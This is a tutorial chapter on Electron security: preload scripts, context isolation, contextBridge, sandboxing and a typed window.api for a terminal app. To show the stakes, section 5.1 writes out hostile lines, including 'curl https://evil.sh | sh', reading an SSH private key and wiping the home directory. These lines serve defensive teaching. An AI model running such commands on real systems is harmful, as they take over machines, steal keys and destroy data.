# Chapter 5 — The Preload Bridge & Context Isolation

> **What you'll learn**
> - Why handing the renderer raw Node access is a security catastrophe (a malicious web resource could run OS commands)
> - What **contextIsolation** is: the page and the preload run in two *separate JavaScript worlds* inside the same window
> - What a **preload script** actually is — a script that runs *before* your page, with a foot in both worlds
> - How **`contextBridge.exposeInMainWorld`** cuts one tiny, safe doorway between those worlds — your `window.api`
> - The canonical pattern: the preload **wraps** `ipcRenderer` into named functions so your React code *never touches `ipcRenderer` directly*
> - A full, worked cmux-linux preload: `sendInput(paneId, data)`, `resizePty(paneId, cols, rows)`, and `onPtyData(cb)` that **returns an unsubscribe function** (the exact shape React's `useEffect` cleanup wants)
> - How to **type `window.api`** in TypeScript with `declare global`
> - The Electron **security checklist** you ship with: `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true`, validate inputs in main
>
> **Prerequisites:** chapters 03, 04. You need the two-process model (main = Node backend, renderer = sandboxed React frontend) and the three IPC patterns (`invoke`/`handle`, `send`/`on`, `webContents.send`/`on`) fresh in your mind. This chapter is the **safe wrapper** around all of them — the thing that turns "raw IPC" into a clean API your app actually calls.

---

## 5.1 The problem: the renderer runs code you don't trust

Chapter 4 ended on a principle: **never trust the renderer.** Let's take that seriously, because it's the entire reason this chapter exists.

Ask yourself what your renderer actually displays. It's a terminal. Into it flows the raw output of `bash`, of `npm install`, of AI agents running arbitrary commands, and — per `FEATURES.md` — eventually the contents of real web pages in browser panels. **None of that is code you wrote.** It's untrusted bytes from the outside world, painted into a Chromium window.

Now imagine you took the "easy" path and gave that Chromium window full Node.js powers — so your React code could just `require('child_process')` and spawn shells directly, no IPC ceremony. Convenient! And catastrophic. Because a browser window is an *attack surface*. Terminal emulators have a long history of escape-sequence bugs; web pages have XSS; npm packages get compromised. The day *any* of those lets a stranger run JavaScript in your renderer, look at what that JavaScript can now reach:

```js
// If the renderer had raw Node access, ANY injected script could do this:
require('child_process').exec('curl https://evil.sh | sh');   // full OS takeover
require('fs').readFileSync('/home/you/.ssh/id_rsa');          // steal your keys
require('fs').rmSync('/home/you', { recursive: true });       // wipe your home dir
```

That's not a renderer bug anymore — that's a **remote code execution hole in a desktop app that runs as you, with your file permissions.** The blast radius is your entire machine.

> **⚠️ Gotcha:** it's tempting to think "but it's *my* React code, I trust it." You're not defending against your code. You're defending against the moment a bug or a bad dependency lets *someone else's* code run inside your window. Security is about what happens **when** — not if — that day comes. The renderer must be built as if it will one day be hijacked, because one day it might be.

So the goal of this chapter is a wall *inside* the renderer: your page can render all the untrusted bytes it wants, but it holds **no OS powers of its own**. The only thing it can do is call a handful of named functions you deliberately handed it — and each of those does exactly one narrow, validated thing in main. That wall is built from three pieces: **context isolation**, a **preload script**, and the **context bridge.**

---

## 5.2 The tempting shortcut, and why it's off by default

Electron has an old flag called **`nodeIntegration`**. When you set `nodeIntegration: true` on a window, Electron injects Node's globals — `require`, `module`, `process`, `Buffer` — straight into the web page. Your React code could then `require('fs')` like it's a Node script.

This is precisely the catastrophe from §5.1, so **Electron turned it off by default in version 5** (2019). Today, `nodeIntegration: false` is the norm, and you should never flip it back on for a window that renders untrusted content — which, for a terminal, is *every* window.

But turning off `nodeIntegration` alone isn't enough, and here's the subtle reason why. Your **preload script** (coming in §5.4) *does* have some privileged access — that's its job. If the preload and the page shared one JavaScript scope, a compromised page could simply reach into the preload's variables and prototypes and steal that access back:

```js
// If page and preload shared a scope, an attacker in the page could do:
Array.prototype.map = function () { /* hijack a method the preload uses */ };
// ...and wait for the preload to call .map() on privileged data. Prototype pollution.
```

Turning off `nodeIntegration` slams the front door. But the preload leaves a side door open — and we need a second mechanism to make sure the page can't sneak through it. That mechanism is **context isolation.**

---

## 5.3 contextIsolation: two JavaScript worlds, one window

Here is the key idea, and it surprises people: a single renderer process can run **two completely separate JavaScript environments** that share the same DOM and the same `window` object — but *not* the same variables, scope, or prototypes. Electron calls these **"worlds."**

- The **main world** is where your web page lives — your React app, your npm packages, and the untrusted content it renders.
- The **isolated world** is where your **preload script** runs — with its privileged access to `ipcRenderer`.

With `contextIsolation: true` (the default since **Electron 12**), these two worlds run as separate V8 contexts. They can both touch the DOM, but a variable declared in one is *invisible* to the other, and prototype tampering in one world does **not** affect the other.

```
            ONE renderer process (one Chromium tab)
 ┌───────────────────────────────────────────────────────────────┐
 │                                                                 │
 │   ISOLATED WORLD                     MAIN WORLD                  │
 │   (your preload script)              (your React page)          │
 │   ┌──────────────────────┐           ┌──────────────────────┐   │
 │   │ can use ipcRenderer   │           │ your app code         │   │
 │   │ can use contextBridge │           │ npm packages          │   │
 │   │ (privileged)          │           │ terminal output       │   │
 │   │                       │           │ (UNTRUSTED)           │   │
 │   └───────────┬──────────┘           └──────────▲───────────┘   │
 │               │        contextBridge             │               │
 │               └──────── exposeInMainWorld ───────┘               │
 │                       (the ONLY connection)                      │
 │                                                                 │
 │        both worlds share the SAME window & DOM,                  │
 │        but have SEPARATE JavaScript scopes (V8 contexts)         │
 └───────────────────────────────────────────────────────────────┘
```

The payoff: even if an attacker owns the main world completely, they **cannot** read the preload's variables or poison the methods the preload relies on. The only thing they can reach is whatever you *explicitly* pushed across the bridge — which you're about to make very small.

> **🔧 In cmux-linux:** this is why the "wall" from Chapter 3 is really *two* walls. Wall one is between main and renderer (separate OS processes, crossed by IPC). Wall two is *inside* the renderer, between the preload's isolated world and the page's main world (separate V8 contexts, crossed by the context bridge). Untrusted terminal bytes live in the main world, two walls away from your shell.

---

## 5.4 What a preload script actually is

A **preload script** is a special file you point a window at. Electron runs it **in the renderer process, in the isolated world, *before* the web page's own JavaScript begins loading.** You register it in the window's `webPreferences`:

```ts
// main.ts — when we create the window
import { BrowserWindow } from 'electron';
import path from 'node:path';

const win = new BrowserWindow({
  webPreferences: {
    preload: path.join(__dirname, 'preload.js'),  // ← this file runs first, privileged
  },
});
win.loadFile('index.html');   // your React app loads AFTER the preload has run
```

Two properties make the preload special, and they're worth stating precisely:

1. **It runs first.** By the time your React app mounts, the preload has already finished. So anything the preload sets up (like `window.api`) is guaranteed to exist before your first component renders — no race, no "is the bridge ready yet?" checks.
2. **It has a foot in both worlds.** The preload is the *only* code with legitimate access to `ipcRenderer` (its privileged Node-ish side) **and** the ability to expose things onto the page's `window` (its page-facing side). It is the designated diplomat between the isolated world and the main world.

```
 window created ─► preload.js runs ─► index.html + your React load ─► app runs
                   │                   │
                   │ sets up           │ can now safely call
                   │ window.api        │ window.api.sendInput(...)
                   └───────────────────┘
                   the bridge is ready BEFORE React ever mounts
```

Think of the preload as the **airlock** on a spacecraft. The vacuum outside (untrusted content) and the crew cabin (main, with OS access) must never touch directly. The airlock is the one controlled chamber that connects to both — and it only ever passes through exactly what you load into it.

> **⚠️ Gotcha:** with `contextIsolation: true`, you **cannot** just write `window.api = {...}` in the preload and expect the page to see it. The preload's `window` and the page's `window` are *different objects in different worlds*. A plain assignment stays trapped in the isolated world. This trips up everyone once. The only sanctioned way to put something on the page's `window` is the context bridge — next section.

---

## 5.5 contextBridge: cutting one safe doorway

`contextBridge` is Electron's API for passing values *from* the isolated world *into* the main world, safely. You call it once, in the preload:

```ts
// preload.ts
import { contextBridge, ipcRenderer } from 'electron';

contextBridge.exposeInMainWorld('api', {
  ping: () => ipcRenderer.invoke('ping'),
});
```

`exposeInMainWorld('api', obj)` does exactly what its name says: it takes `obj` and makes it available in the **main world** as `window.api`. Read the method name literally — *"expose into the main world"* — and it stops being jargon. (Now the name "main world" pays off too: it's the world where `window.api` shows up.)

What crosses the bridge is deliberately restricted, and the rules rhyme with the structured-clone rules from Chapter 4:

- **Functions** cross fine — they become callable **proxies** in the page. When the page calls `window.api.ping()`, the *real* function still executes back in the isolated world (where `ipcRenderer` actually lives). The page holds a remote control, not the machine.
- **Serializable values** (strings, numbers, booleans, plain objects/arrays) are **copied** across.
- The exposed object is effectively frozen from the page's side — the page can't reach *through* your functions to grab `ipcRenderer` itself.

This is the whole trick. The page never receives `ipcRenderer`. It receives a small tray of functions that, when called, run privileged code *on the other side of the bridge* and hand back only plain results. You decide exactly what's on that tray.

> **🔧 In cmux-linux:** the tray is our `window.api`. It's the same `window.api` you saw all through Chapters 1 and 4 (`window.api.sendInput(...)`, `window.api.onPtyData(...)`). Now you know what it *is*: not a global someone declared, but an object the preload deliberately handed to the page across the context bridge. Everything the renderer is *allowed* to do to the backend is the set of keys on this one object.

---

## 5.6 The canonical pattern: wrap `ipcRenderer`, never expose it

Now the single most important design rule in this chapter. Chapter 4 said the renderer talks to main over IPC channels like `pty:input` and `pty:data`. You might think the preload's job is to hand the page a way to *use those channels*. It is — but **how narrowly** you do that is everything.

Here's the trap. This looks safe, because it's "just a wrapper," not literally `ipcRenderer`:

```ts
// ❌ ANTI-PATTERN: a generic pass-through. Do NOT do this.
contextBridge.exposeInMainWorld('api', {
  invoke: (channel: string, payload: unknown) => ipcRenderer.invoke(channel, payload),
  on:     (channel: string, cb: (...a: any[]) => void) => ipcRenderer.on(channel, cb),
});
```

It's a disaster in disguise. You've handed the page a fully general remote to your **entire IPC surface.** The page can now call *any channel* with *any payload*:

```js
// The page (or an attacker in it) can now hit every handler you have:
window.api.invoke('pty:spawn', { cwd: '/', shell: '/bin/sh', cols: 80, rows: 24 });
window.api.invoke('pty:kill', { paneId: someoneElsesPane });
```

You've recreated raw `ipcRenderer` with two extra characters. Exposing a generic `invoke`/`on` **defeats the entire purpose** of the bridge.

The fix is to expose **named, specific functions with the channel baked in**. The page can only perform the exact verbs you named, with the shapes you control:

```
 ❌ GENERIC PASS-THROUGH                    ✅ NAMED, NARROW API
 ──────────────────────────                ─────────────────────────────
 window.api.invoke(ANY_CHANNEL, ANY)       window.api.sendInput(paneId, data)
 window.api.on(ANY_CHANNEL, cb)            window.api.resizePty(id, cols, rows)
                                           window.api.onPtyData(cb)
 attacker gets your WHOLE IPC surface,     attacker gets 4 fixed verbs,
 any channel, any payload                  each with a shape you validate
```

The `sendInput` function *always* invokes `pty:input`, never anything else. The page literally cannot ask to spawn a shell in `/` because there is no function on the tray that does that with page-controlled arguments. **You are not just wrapping IPC for convenience — you're wrapping it to shrink the attack surface to a list of verbs you can reason about.** This is the concrete meaning of "keep the exposed surface tiny" from Chapter 4's §4.11.

---

## 5.7 The full cmux-linux preload, worked end to end

Let's build the real thing. This preload exposes exactly the operations the terminal needs — the renderer→main actions as `invoke` wrappers (Pattern 1 from Chapter 4), and the main→renderer streams as subscription functions (Pattern 3). Read it once, then we'll walk every line.

```ts
// preload.ts — runs in the renderer's ISOLATED world, before the page loads.
import { contextBridge, ipcRenderer, type IpcRendererEvent } from 'electron';

const api = {
  // ── renderer → main : "do a thing, tell me how it went" (invoke/handle) ──

  spawnPty: (opts: { cwd: string; cols: number; rows: number }) =>
    ipcRenderer.invoke('pty:spawn', opts) as Promise<{ paneId: string }>,

  sendInput: (paneId: string, data: string) =>
    ipcRenderer.invoke('pty:input', { paneId, data }) as Promise<{ ok: true }>,

  resizePty: (paneId: string, cols: number, rows: number) =>
    ipcRenderer.invoke('pty:resize', { paneId, cols, rows }) as Promise<{ ok: true }>,

  killPty: (paneId: string) =>
    ipcRenderer.invoke('pty:kill', { paneId }) as Promise<{ ok: true }>,

  // ── main → renderer : "push me every chunk" (webContents.send/on) ──
  // Each subscriber RETURNS an unsubscribe function. Call it to stop listening.

  onPtyData: (cb: (msg: { paneId: string; data: string }) => void) => {
    const listener = (_event: IpcRendererEvent, msg: { paneId: string; data: string }) =>
      cb(msg);                                   // forward ONLY the data, never _event
    ipcRenderer.on('pty:data', listener);
    return () => ipcRenderer.removeListener('pty:data', listener);   // ← unsubscribe
  },

  onPtyExit: (cb: (msg: { paneId: string; code: number }) => void) => {
    const listener = (_event: IpcRendererEvent, msg: { paneId: string; code: number }) =>
      cb(msg);
    ipcRenderer.on('pty:exit', listener);
    return () => ipcRenderer.removeListener('pty:exit', listener);
  },
};

// The ONE doorway. Everything the renderer may do to the backend is on `api`.
contextBridge.exposeInMainWorld('api', api);

// Export the type so the renderer can reuse the exact shape (see §5.9).
export type CmuxApi = typeof api;
```

Now the walkthrough:

- **`import { contextBridge, ipcRenderer } from 'electron'`.** These imports work *here* because the preload runs in the privileged isolated world. This same import in your React code would give you nothing useful — that's the point.
- **The four `invoke` wrappers** (`spawnPty`, `sendInput`, `resizePty`, `killPty`) each hard-code one channel and shape the payload as a named-field object, exactly the discipline from Chapter 4's §4.7. `sendInput(paneId, data)` turns two friendly positional arguments into `ipcRenderer.invoke('pty:input', { paneId, data })`. The renderer sees an ergonomic function; the channel name is an implementation detail hidden inside the preload. If we ever rename the channel, only this file changes.
- **The `as Promise<...>` casts** document what each call resolves to. They don't *enforce* anything at runtime (main is the source of truth), but they give the renderer accurate types for free. Section 5.9 makes this airtight.
- **`onPtyData(cb)`** is the interesting one. It registers a listener on the `pty:data` channel and — crucially — **returns a function that removes that exact listener.** We'll dissect this in §5.8, because it's the linchpin that connects to React.
- **We forward only `msg`, never `_event`.** The Electron listener receives `(event, payload)`. We deliberately drop `event` and call the page's `cb` with just `msg`. More on why in the Gotcha below.
- **`exposeInMainWorld('api', api)`** cuts the doorway. After this line, and before React mounts, `window.api` exists in the page with these six functions and nothing else.

> **⚠️ Gotcha:** notice we call `cb(msg)` and *not* `cb(event, msg)`. That Electron `event` object is powerful — it carries references like `event.sender`. Passing it across the bridge into the untrusted main world hands the page a lever it should never hold. **Strip the event; forward only plain data.** This mirrors Chapter 4's rule that only plain, data-shaped things belong on the wire — here it applies to what you hand the page, too.

> **🔧 In cmux-linux:** these six functions are the complete contract between our frontend and backend for the *terminal*. Later chapters add more keys to `window.api` — `onWorkspaceUpdate`, `onNotification` (Chapters 11 and 12) — but they're built from the *identical* two shapes you see here: an `invoke` wrapper for actions, a subscribe-and-return-unsubscribe function for pushes. Learn the two shapes and every future addition is copy-paste-with-a-new-channel.

---

## 5.8 Why `onPtyData` returns a function (the unsubscribe pattern)

This is the detail Chapter 4 promised twice, so let's earn it properly.

Recall the "#1 memory leak in Electron" from §4.5: `ipcRenderer.on` **adds** a listener; it never replaces one. Subscribe five times and every `pty:data` message fires your callback five times — the terminal paints each chunk five times, and memory climbs with dead listeners. So every `on` needs a matching `removeListener`. The problem: `removeListener` requires a reference to the **exact same function** you passed to `on`. If you can't hand that reference back, you can't clean up.

Our preload solves this by **capturing the listener in a closure and returning a remover that already holds the reference**:

```ts
onPtyData: (cb) => {
  const listener = (_event, msg) => cb(msg);   // (1) create ONE stable listener
  ipcRenderer.on('pty:data', listener);        // (2) subscribe with it
  return () => ipcRenderer.removeListener('pty:data', listener);  // (3) hand back the "undo"
},
```

Three moves: **(1)** we make one concrete `listener` function and keep it in a local variable. **(2)** we subscribe *that* function. **(3)** we return a closure that, when called, removes *that same* function. The caller never sees `ipcRenderer` or the listener — they just get a clean "undo button." Calling it once, exactly, tears down the subscription.

Why is a function the perfect return value? Because of what the renderer does with it. React's `useEffect` cleanup expects you to **return a teardown function**, and `onPtyData` hands you one shaped *precisely* for that slot (this is built in full in `08-react-in-this-app.md`):

```ts
// renderer (React) — subscribing to a pane's output, then cleaning up perfectly
useEffect(() => {
  const unsubscribe = window.api.onPtyData(({ paneId, data }) => {
    if (paneId === myPaneId) term.write(data);   // paint only MY pane's bytes
  });

  return unsubscribe;   // React calls this on unmount / before re-running the effect
}, [myPaneId]);
```

Read the payoff slowly: `onPtyData` returns `unsubscribe`, and `useEffect`'s contract is "return your cleanup." So we just `return unsubscribe`. When the component unmounts (a pane closes) or `myPaneId` changes, React invokes it, the listener is removed, and there is **zero** leak. The preload's design and React's design click together like two halves of a buckle — and that's not an accident, it's *why* we returned a function instead of, say, a subscription id you'd have to remember to pass to a separate `offPtyData`.

> **⚠️ Gotcha:** if `onPtyData` returned nothing (or you ignored its return value), each mount would stack another live listener. In a tiling terminal where panes open and close constantly, you'd have a textbook leak: output duplicating, then tripling, memory creeping, the app slowly dying. The unsubscribe *is* the feature. Always return it from the preload; always wire it into cleanup in React.

> **🔧 In cmux-linux:** every push-style key on `window.api` follows this exact contract — subscribe, return an unsubscribe. It's a house rule. When you add `onWorkspaceUpdate` for the sidebar (Chapter 11), it returns an unsubscribe too, and the sidebar component cleans it up in `useEffect` the same way. One pattern, enforced everywhere, means listener leaks simply aren't a class of bug we have.

---

## 5.9 Typing `window.api` in TypeScript

Right now, TypeScript doesn't know `window.api` exists — the global `Window` type has no `api` property, so every `window.api.sendInput(...)` in the renderer is a red squiggle. We fix that with **declaration merging**: we *augment* the built-in `Window` interface to add our `api`.

Create a `.d.ts` file the renderer includes, and reuse the exact `CmuxApi` type the preload already exported (so the two can never drift apart):

```ts
// renderer/global.d.ts
import type { CmuxApi } from '../preload';   // the SAME shape the preload exposes

declare global {
  interface Window {
    api: CmuxApi;         // now window.api is fully typed everywhere in the renderer
  }
}

export {};   // makes this file a module, which `declare global` requires
```

What each part does:

- **`import type { CmuxApi } from '../preload'`** pulls in the *single source of truth* — the `export type CmuxApi = typeof api` from §5.7. Because the type is *derived* from the real preload object with `typeof`, you can never accidentally promise the renderer a function the preload doesn't actually expose. Add a key in the preload, it appears in the renderer's types automatically. Delete one, the renderer stops compiling. The bridge's two sides stay in lockstep.
- **`declare global { interface Window { api: CmuxApi } }`** is TypeScript's mechanism for adding a property to an existing global interface. `interface`s are *open* — declaring `Window` again *merges* with the built-in one rather than replacing it — so this adds `api` alongside `document`, `location`, and everything else already on `window`.
- **`export {}`** is a small but load-bearing incantation. A `.d.ts` file with no top-level `import`/`export` is treated as a *global script*, and `declare global` is only legal inside a *module*. The empty export flips the file into module mode. (If you already have the `import type` line above, you technically don't need `export {}` — but it's harmless and makes the intent explicit.)

With that file in your project, the renderer now gets full IntelliSense and compile-time checking on the bridge:

```ts
// renderer — fully typed, autocompleted, no imports needed
const { paneId } = await window.api.spawnPty({ cwd: '~/project', cols: 80, rows: 24 });
await window.api.sendInput(paneId, 'ls\n');        // ✓ (string, string)
await window.api.sendInput(paneId, 42);            // ✗ compile error: number not assignable to string
const stop = window.api.onPtyData(({ data }) => term.write(data));   // ✓ stop: () => void
```

That last line's inferred type — `stop: () => void` — is the unsubscribe from §5.8, now visible and type-checked. The whole bridge is as safe *and* as ergonomic as any local module, even though under the hood every call is hopping worlds and processes.

> **🔧 In cmux-linux:** we keep the API's data shapes (`{ paneId, data }`, `{ paneId, cols, rows }`) in the shared types file from `09-typescript-and-the-data-model.md`, and both the preload and main's handlers import them. That's three places — main, preload, renderer — all pinned to one set of types. A payload can't drift out of shape without the compiler catching it in at least one of them.

---

## 5.10 sandbox: the extra hardening layer

There's one more flag that completes the picture: **`sandbox: true`** (the default since **Electron 20**). Context isolation separates the two *worlds*; the sandbox restricts what the whole *renderer process* — preload included — is even capable of at the OS level.

Concretely, when the sandbox is on, your **preload runs in a stripped-down environment.** It keeps the essentials it needs to be a bridge — `ipcRenderer` and `contextBridge` still work — but it **loses the ability to pull in arbitrary Node modules.** A sandboxed preload cannot meaningfully `require('fs')` or `require('child_process')`:

```ts
// preload.ts with sandbox: true
import { contextBridge, ipcRenderer } from 'electron';  // ✓ still available
import fs from 'node:fs';                                 // ✗ not usable — sandbox blocks it
```

At first this feels like a limitation. It's actually a *feature that enforces good architecture*. It makes the wrong design physically impossible: you literally cannot smuggle real filesystem or process access into the renderer via the preload, even by accident. All heavy lifting — spawning shells, touching files — is *forced* to live in main, reached only through the IPC channels you defined. The sandbox turns "you shouldn't do OS work in the renderer" from a guideline into a wall.

> **🔧 In cmux-linux:** we keep all three defaults on — `contextIsolation`, `nodeIntegration: false`, and `sandbox` — and we're happy to. Our preload's only job is to marshal `ipcRenderer` calls, which the sandbox permits. Every real OS action (node-pty in Chapter 6, the socket server in Chapter 11, session files in Chapter 13) lives in main by design. We never fight the sandbox because we never needed the powers it removes.

---

## 5.11 The security checklist you ship with

Pull the whole chapter into the one config block where it all becomes real — creating the window in main:

```ts
// main.ts — the security posture of the entire app, in one object
const win = new BrowserWindow({
  webPreferences: {
    preload: path.join(__dirname, 'preload.js'),  // the ONLY bridge to privilege
    contextIsolation: true,   // page & preload in separate worlds  (default)
    nodeIntegration: false,   // no require/process/Buffer in the page (default)
    sandbox: true,            // OS sandbox + a restricted preload   (default)
  },
});
```

And the checklist those flags belong to — the posture to verify on every window that renders untrusted content (i.e. every window in cmux-linux):

1. **`contextIsolation: true`** — page and preload never share a JavaScript scope. Never turn this off.
2. **`nodeIntegration: false`** — the page gets no `require`, `process`, or `Buffer`. Never turn this on.
3. **`sandbox: true`** — the renderer (and preload) can't reach arbitrary OS APIs; all real work is forced into main.
4. **Expose a minimal `window.api`, never raw `ipcRenderer`.** Named functions with fixed channels only — no generic `invoke`/`on` pass-through (§5.6). Strip the Electron `event` from pushes (§5.7).
5. **Validate every input in main.** The bridge shrinks *what* the renderer can ask for; it does **not** vet the *arguments*. A hostile main-world script can still call `window.api.spawnPty({ cwd: '/etc', ... })`. So main re-checks every payload — path is allowed, `paneId` is real, shell is whitelisted — exactly as Chapter 4's §4.11 laid out. **The preload narrows the verbs; main guards the values. You need both.**

That last point is the one people forget, so say it plainly: **the context bridge is not input validation.** It controls the *menu* of operations, not the *contents* of each order. Think of `window.api` as the set of routes your server exposes and main's handlers as the controllers that still validate `req.body`. You'd never skip server-side validation just because your frontend only renders certain buttons — same discipline here.

> **⚠️ Gotcha:** a beginner secures the preload beautifully — tiny `window.api`, no raw `ipcRenderer` — and then writes an `ipcMain.handle('pty:spawn', (e, opts) => spawnShell(opts))` that trusts `opts.cwd` and `opts.shell` verbatim. The wall has a door left wide open. The preload and main are **two layers of one defense**; a gap in either is a gap in both. Secure the doorway *and* validate what comes through it.

---

## 🧪 Checkpoint

Answer these before moving on (everything's in this chapter):

1. In one sentence, why is giving the renderer raw Node access (`nodeIntegration: true`) dangerous for an app that renders terminal output?
2. `contextIsolation: true` creates two "worlds" in one renderer. Name them, say which one the preload runs in and which one your React app runs in, and state one thing they share and one thing they don't.
3. You write `window.foo = 42` in the preload with context isolation on, and the page logs `window.foo` as `undefined`. Why? What's the correct way to expose `foo`?
4. A teammate exposes `{ invoke: (ch, p) => ipcRenderer.invoke(ch, p) }` as `window.api` and says "see, no raw `ipcRenderer`." Explain why this still defeats the purpose, and what to expose instead.
5. Why does `onPtyData(cb)` return a *function*? Trace what would leak if it returned nothing and a React component mounted/unmounted 20 times.
6. What does `declare global { interface Window { api: CmuxApi } }` accomplish, and why do we derive `CmuxApi` with `typeof api` from the preload instead of writing the interface by hand?
7. The context bridge limits the renderer to four terminal verbs. Does that mean main can trust the arguments to `spawnPty`? Explain the "preload narrows the verbs; main guards the values" split.

---

## Summary

The renderer displays untrusted content (terminal output, agent commands, later web pages), so it must hold **no OS powers of its own** — otherwise a single renderer exploit becomes full machine takeover. Electron enforces this with three defaults you keep on: **`nodeIntegration: false`** (no Node globals in the page), **`contextIsolation: true`** (the page's "main world" and the preload's "isolated world" are separate V8 contexts sharing only the DOM), and **`sandbox: true`** (even the preload can't reach arbitrary OS APIs). The **preload script** runs before your page in the isolated world with access to `ipcRenderer`, and **`contextBridge.exposeInMainWorld('api', ...)`** cuts the single safe doorway — your `window.api`. The cardinal rule: the preload **wraps** each IPC channel into a **named, narrow function** (`sendInput`, `resizePty`, `onPtyData`) so the renderer never touches `ipcRenderer` directly and the attack surface is a short list of verbs; exposing a generic `invoke`/`on` throws that away. Push-style subscribers **return an unsubscribe function** so React's `useEffect` cleanup removes listeners perfectly and nothing leaks. You **type `window.api`** by augmenting the global `Window` interface with a `typeof`-derived `CmuxApi`, keeping preload and renderer in lockstep. And you finish with the checklist — isolation on, nodeIntegration off, sandbox on, minimal `window.api`, and **validate every payload in main**, because the bridge narrows *what* can be asked, never *whether the arguments are safe*.

## Where this shows up next
- Consuming `window.api` inside React and wiring `onPtyData`'s unsubscribe into `useEffect` cleanup → `08-react-in-this-app.md`
- What main actually *does* behind `pty:spawn`/`pty:input`/`pty:resize` — driving the real shell → `06-node-pty.md`
- What the renderer does with the `pty:data` it receives — painting it → `07-xtermjs.md`
- The shared payload types (`{ paneId, data }`, etc.) that main, preload, and renderer all import → `09-typescript-and-the-data-model.md`
- More `window.api` keys built on the same two shapes — the sidebar's `onWorkspaceUpdate` → `11-the-socket-api.md` and the ring/flash `onNotification` → `12-notifications-and-osc.md`
- How the preload is bundled as its own entry point, separate from main and renderer → `14-build-tooling-and-vite.md`
- The full keystroke-and-notification trace that runs through this bridge end to end → `17-how-it-all-connects.md`

## Further reading
- Electron — Context Isolation (the two worlds, why and how): https://www.electronjs.org/docs/latest/tutorial/context-isolation
- Electron — `contextBridge` API reference: https://www.electronjs.org/docs/latest/api/context-bridge
- Electron — Process Sandboxing (what `sandbox: true` restricts): https://www.electronjs.org/docs/latest/tutorial/sandbox
- Electron — Security, and the official checklist (read the whole page): https://www.electronjs.org/docs/latest/tutorial/security
- Electron — Preload scripts in the tutorial (a gentle end-to-end intro): https://www.electronjs.org/docs/latest/tutorial/tutorial-preload
- Electron — `BrowserWindow` `webPreferences` (every flag in one place): https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions
